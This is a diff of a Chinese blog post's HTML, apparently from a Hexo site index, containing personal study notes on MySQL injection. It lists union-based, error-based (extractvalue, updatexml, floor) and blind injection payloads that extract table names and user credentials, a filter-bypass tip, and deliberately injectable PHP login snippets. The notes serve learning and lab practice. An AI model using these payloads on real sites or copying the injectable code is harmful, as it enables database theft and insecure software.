@@ -80,25 +80,22 @@ var_dump( $a != 1);
     
     <entry>
       <title><![CDATA[MySql 注入杂记]]></title>
-      <url>/2017/10/06/mysql/</url>
-      <content type="html"><![CDATA[<p><img src="http://ourd90bac.bkt.clouddn.com/mysql.jpg" alt=""></p>
-<h3 id="1-基础知识准备："><a href="#1-基础知识准备：" class="headerlink" title="1.基础知识准备："></a>1.基础知识准备：</h3><h4 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h4><ul>
-<li><p>基于从服务器的响应：<br>1.基于错误的sql注入；<br>2.联合查询的类型；</p>
-<a id="more"></a>
-<p>3.SQL盲注：</p>
-<pre><code>基于布尔的盲注
+      <url>/2017/10/06/MySQL%E6%B3%A8%E5%85%A5%E6%9D%82%E8%AE%B0/</url>
+      <content type="html"><![CDATA[<h1 id="MySQL注入杂记"><a href="#MySQL注入杂记" class="headerlink" title="MySQL注入杂记"></a>MySQL注入杂记</h1><p><img src="http://ourd90bac.bkt.clouddn.com/mysql.jpg" alt=""></p>
+<h2 id="1-基础知识准备："><a href="#1-基础知识准备：" class="headerlink" title="1.基础知识准备："></a>1.基础知识准备：</h2><h3 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h3><ul>
+<li>基于从服务器的响应：<br>1.基于错误的sql注入；<br>2.联合查询的类型；<br>3.SQL盲注：<pre><code>基于布尔的盲注
 基于时间的盲注
 基于报错的盲注
-</code></pre></li>
+</code></pre><a id="more"></a></li>
 <li><p>基于注入的数据类型：<br>1.基于字符串<br>2.基于数字</p>
 </li>
 <li><p>基于程度和顺序<br>1.一阶注入；<br>2.二阶注入；<br>3.</p>
 </li>
 <li>基于注入位置<br>1.基于用户输入表单域的注入；<br>2.通过cookie注入；<br>3.通过服务器变量注入。（基于头部信息注入）</li>
 </ul>
-<h4 id="MySQL系统函数"><a href="#MySQL系统函数" class="headerlink" title="MySQL系统函数"></a>MySQL系统函数</h4><p>1.version() :mysql版本信息<br>2.user():数据库用户名<br>3.database():数据库名<br>4.@@datadir():数据库路径<br>5.@@version_compile_os():操作系统版本</p>
-<h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><p>1.concat(str1,str2,….):没有分隔符地连接字符串<br>2.concat_ws(separator.str1,str2,…)含有分隔符地连接字符串<br>3.group_concat(str1,str2,…):连接一族所有的字符串，并用逗号分隔</p>
-<h3 id="2-GET联合查询（有回显报错）"><a href="#2-GET联合查询（有回显报错）" class="headerlink" title="2.GET联合查询（有回显报错）"></a>2.GET联合查询（有回显报错）</h3><p>1.测试<code>id</code>值后的闭合符号，以及注释符。</p>
+<h3 id="MySQL系统函数"><a href="#MySQL系统函数" class="headerlink" title="MySQL系统函数"></a>MySQL系统函数</h3><p>1.version() :mysql版本信息<br>2.user():数据库用户名<br>3.database():数据库名<br>4.@@datadir():数据库路径<br>5.@@version_compile_os():操作系统版本</p>
+<p>###函数介绍<br>1.concat(str1,str2,….):没有分隔符地连接字符串<br>2.concat_ws(separator.str1,str2,…)含有分隔符地连接字符串<br>3.group_concat(str1,str2,…):连接一族所有的字符串，并用逗号分隔</p>
+<h2 id="2-GET联合查询（有回显报错）"><a href="#2-GET联合查询（有回显报错）" class="headerlink" title="2.GET联合查询（有回显报错）"></a>2.GET联合查询（有回显报错）</h2><p>1.测试<code>id</code>值后的闭合符号，以及注释符。</p>
 <blockquote>
 <p>常见注释：<br>–+<br>#<br>`</p>
 </blockquote>
@@ -109,10 +106,27 @@ var_dump( $a != 1);
 <p><strong>查询表名（table）</strong>：<code>id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
 <p><strong>查询列名（column）</strong>：<code>id=-1&#39; union select 1, group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
 <p><strong>查询字段名</strong>：<code>id=-1 union select 1,username,password from users where id=2--+</code></p>
-<h3 id="3-盲注的相关知识"><a href="#3-盲注的相关知识" class="headerlink" title="3. 盲注的相关知识"></a>3. 盲注的相关知识</h3><ul>
+<p>##3. GET报错注入（无回显）<br>此种注入时区别于上一种联合查询的有回显报错的，此种无回显报错注入只能用到另外的函数来进行报错回显注入。</p>
+<ul>
+<li><p><code>extractvalue</code><br>其核心的语句大家都应该能看出是<code>select</code>后查询语句。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#爆数据库</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select database())))-- </div><div class="line">#爆表</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- </div><div class="line">#爆列</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1)))-- </div><div class="line">#爆字段</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))--</div></pre></td></tr></table></figure>
+</li>
+<li><p><code>updatexml</code><br>与上面的<code>extractvalue</code>相差不大</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and 1=(updatexml(0x3a,concat(1,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>))<span class="comment">--</span></div></pre></td></tr></table></figure>
+</li>
+<li><p><code>floor</code><br>同上</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">union+<span class="keyword">select</span>+<span class="number">1</span>+<span class="keyword">from</span>+(<span class="keyword">select</span>+<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span>+table_name+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()+<span class="keyword">limit</span>+<span class="number">0</span>,<span class="number">1</span>))a+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">group</span>+<span class="keyword">by</span>+a)b</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>##4. 盲注的相关知识</p>
+<ul>
 <li>基于布尔盲注—–构造逻辑结构判断</li>
 </ul>
-<p>相关字符串截取函数：<br>1.<code>left(database(),1)&gt;&#39;s&#39;</code>   ：database()显示数据库名，left(a,b)从左侧截取a的前b位<br>2.<code>ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1)1,1)--+</code>：substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。<br>3.<code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER
+<p>相关字符串截取函数：<br>1.<code>left(database(),1)&gt;&#39;s&#39;</code>   ：database()显示数据库名，left(a,b)从左侧截取a的前b位<br>2.<code>ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1)1,1)--+</code>：substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。</p>
+<blockquote>
+<p><code>substr()</code>的小技巧：例如在<code>substr(database(),1,1)</code>中逗号被过滤了，我们可以使用<code>from 1 to 1</code>来绕过过滤。<br>那么有同样格式的<code>limit 0,1</code>有没有这样的绕过呢？当然有。格式为：<code>1 offset 0</code>这里注查询数字的顺序。</p>
+</blockquote>
+<p>3.<code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER
 BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字符串a的c位。ord()函数和ascii()函数一样将字符转为ascii码。</p>
 <ul>
 <li>基于报错的MySQL盲注</li>
@@ -130,8 +144,16 @@ BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字�
 <p><strong>注意</strong>：select后的1表示我们查询的是这个字段的第一个值，若我们想查询其他字段中的值，直接更换这里的’users’即可，所以这里的limit 0,1起不到限定作用，可有可无。</p>
 <p>2.使用<code>ord()</code>与<code>mid()</code>函数</p>
 <p>解释：这里的mid()函数与substr()函数类似，有一样的功能。函数原型为：<code>MID(ColumnName, Start [, Length])</code>对字符串从start位置开始截取相应的长度。这里我就可以在substr()被禁的情况下做替换。</p>
-<hr>
-<p>未完待续………………..</p>
+<h2 id="4-POST注入"><a href="#4-POST注入" class="headerlink" title="4.POST注入"></a>4.POST注入</h2><p>常见的Post注入分为两类：</p>
+<ol>
+<li><p>同时验证用户名和密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$sql = select * from users where username=$usernmae <span class="keyword">and</span> password=$password limit <span class="number">1</span>,<span class="number">1</span></div><div class="line">$result = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>($result) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"登陆失败"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>用户名与密码分步验证</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="string">"select password from users where username='$username'"</span></div><div class="line">$result = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>($result) &#123;</div><div class="line">    $row = mysql_fetch_row($result);</div><div class="line">    $query_password = $row[$password];</div><div class="line">    <span class="comment">#对输入的$password进行变形</span></div><div class="line">    $input_password = modify($passowrd);</div><div class="line">    <span class="keyword">if</span>($input_password == $query_password) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"密码错误"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"用户不存在"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>我们在大多数情况下遇到的都是第一种情况，其实第一种情况与第二种情况并无太大区别，就是在查询成功后页面返回不同而已。其余的都和普通的注入一样。这里就不再反复赘述。</p>
 ]]></content>
       
         
